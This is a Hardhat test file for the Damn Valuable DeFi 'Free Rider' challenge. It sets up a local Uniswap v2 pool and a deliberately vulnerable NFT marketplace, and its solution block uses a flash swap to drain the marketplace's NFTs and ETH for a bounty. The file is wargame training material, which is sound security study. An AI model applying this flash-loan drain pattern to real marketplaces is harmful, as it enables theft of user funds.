// Get compiled Uniswap v2 data
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Free Rider', function () {
    let deployer, player, devs;
    let weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, nft, devsContract;

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    const NFT_PRICE = 15n * 10n ** 18n;
    const AMOUNT_OF_NFTS = 6;
    const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
    
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;

    const BOUNTY = 45n * 10n ** 18n;

    // Initial reserves for the Uniswap v2 pool
    const UNISWAP_INITIAL_TOKEN_RESERVE = 15000n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 9000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, devs] = await ethers.getSigners();

        // Player starts with limited ETH balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy WETH
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy token to be traded against WETH in Uniswap v2
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
            ethers.constants.AddressZero // _feeToSetter
        );
        uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
            uniswapFactory.address,
            weth.address
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // The function takes care of deploying the pair automatically
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,                                              // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapPair.token0()).to.eq(weth.address);
        expect(await uniswapPair.token1()).to.eq(token.address);
        expect(await uniswapPair.balanceOf(deployer.address)).to.be.gt(0);

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
            AMOUNT_OF_NFTS,
            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
        );

        // Deploy NFT contract
        nft = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await marketplace.token());//attach is similar to ethers.getContractAt function
        expect(await nft.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nft.rolesOf(marketplace.address)).to.eq(await nft.MINTER_ROLE());

        // Ensure deployer owns all minted NFTs. Then approve the marketplace to trade them.
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await nft.ownerOf(id)).to.be.eq(deployer.address);
        }
        await nft.setApprovalForAll(marketplace.address, true);
        console.log("OffersCount1 : ", await marketplace.offersCount());
        // Open offers in the marketplace
        await marketplace.offerMany(
            [0, 1, 2, 3, 4, 5],
            [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
        );
        console.log("OffersCount2 : ", await marketplace.offersCount());
        expect(await marketplace.offersCount()).to.be.eq(6);

        // Deploy devs' contract, adding the player as the beneficiary
        devsContract = await (await ethers.getContractFactory('FreeRiderRecovery', devs)).deploy(
            player.address, // beneficiary
            nft.address, 
            { value: BOUNTY }
        );
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Convert Ether to WETH
        const etherAmountInWei = 5n * 10n ** 16n;
        await weth.connect(player).deposit({ value: etherAmountInWei });
        const bal = await uniswapPair.balanceOf(player.address);
        console.log("Bal : ", bal);
        const balanceBefore = await weth.balanceOf(player.address);
        console.log("weth balanceBefore: ", balanceBefore);

        const flash = await ethers.getContractFactory("UniswapFlashSwap");
        const flashSwapContract = await flash.deploy(token.address, uniswapFactory.address, marketplace.address, nft.address);
        console.log("getPair",  await uniswapFactory.getPair(token.address, weth.address));
        //1 transfer weth token to the flashSwap contract this is to cover the fee 0.3% here we transfered all of players's token
        const transfer = await weth.connect(player).transfer(flashSwapContract.address, balanceBefore);
        await transfer.wait();
        console.log("3");
        const amountToBorrow = 15n * 10n ** 18n;
        //2 flash swap
        const borrowTx = await flashSwapContract.connect(player).flashSwap(weth.address, amountToBorrow);
        const receipt = await borrowTx.wait();

        console.log("await marketplace.offersCount()", await marketplace.offersCount());
        console.log("await ethers.provider.getBalance(marketplace.address)", await ethers.provider.getBalance(marketplace.address));
        console.log("await ethers.provider.getBalance(player.address)", await ethers.provider.getBalance(player.address));
        console.log("await ethers.provider.getBalance(devsContract.address)", await ethers.provider.getBalance(devsContract.address));

        const data = ethers.utils.defaultAbiCoder.encode([ "address" ], [ player.address]);
        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            //there is an overloading problem from js to contract
            //If you have two methods with the same name, you must specify the fully qualified signature to access it
            //await nft.safeTransferFrom(player.address, devsContract.address, tokenId);
            await nft.connect(player)['safeTransferFrom(address,address,uint256,bytes)'](player.address, devsContract.address, tokenId,data);
        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // The devs extract all NFTs from its associated contract
        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            await nft.connect(devs).transferFrom(devsContract.address, devs.address, tokenId);
            expect(await nft.ownerOf(tokenId)).to.be.eq(devs.address);
        }

        //Exchange must have lost NFTs and ETH
        expect(await marketplace.offersCount()).to.be.eq(0);
        expect(
            await ethers.provider.getBalance(marketplace.address)
        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);

        //Player must have earned all ETH
        expect(await ethers.provider.getBalance(player.address)).to.be.gt(BOUNTY);
        expect(await ethers.provider.getBalance(devsContract.address)).to.be.eq(0);
    });
});
